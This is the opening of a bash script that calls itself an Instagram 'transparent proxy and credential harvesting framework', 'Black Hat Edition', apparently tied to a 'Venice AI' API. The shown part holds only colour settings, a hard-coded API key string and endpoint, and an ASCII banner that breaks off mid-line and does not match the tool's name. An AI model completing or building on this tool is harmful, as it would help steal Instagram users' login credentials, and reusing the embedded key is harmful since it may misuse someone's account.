#!/bin/bash
# ZOPHREX: Advanced Instagram Transparent Proxy & Credential Harvesting Framework
# Author: Venice
# Version: 5.0 - AI-Enhanced Black Hat Edition
# API Integration: Venice AI v4.6

# Color scheme for enhanced UI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Venice AI API Configuration
VENICE_API_KEY="VENICE_ADMIN_KEY_d-aOL3YeNZY_QdBZM8yYRxNhqorBMzBqjVhSLPTV1I"
VENICE_API_ENDPOINT="https://api.venice.ai/v1/analyze"

# Enhanced banner with ASCII art
function banner() {
    clear
    echo -e "${RED}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "\${RED}║                                                                                                                                                  ║\${NC}"
    echo -e "${RED}║${WHITE}    ████████╗██╗    ██╗██╗████████╗████████╗███████╗██████╗  █████╗ ██████╗ ██╗████████╗██╗   ██████╗ ██╗   ██╗██████╗  ██████╗  ${WHITE}║${NC}"
    echo -e "${RED}║${WHITE}    ╚══██╔══╝██║    ██║██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔════╝ ██║   ██║██╔══██╗██╔════╝ ██╔═══██╗ ${WHITE}║${NC}"
    echo -e "${RED}║${WHITE}       ██║   ██║ █╗ ██║██║   ██║      ██║   █████╗  ██████╔╝███████║██████╔╝██║   ██║    ╚██╗██║      ██║   ██║██████╔╝██║  ███╗██████╔╝ ${WHITE}║${NC}"
    echo -e "${RED}║${WHITE}       ██║   ██║███╗██║██

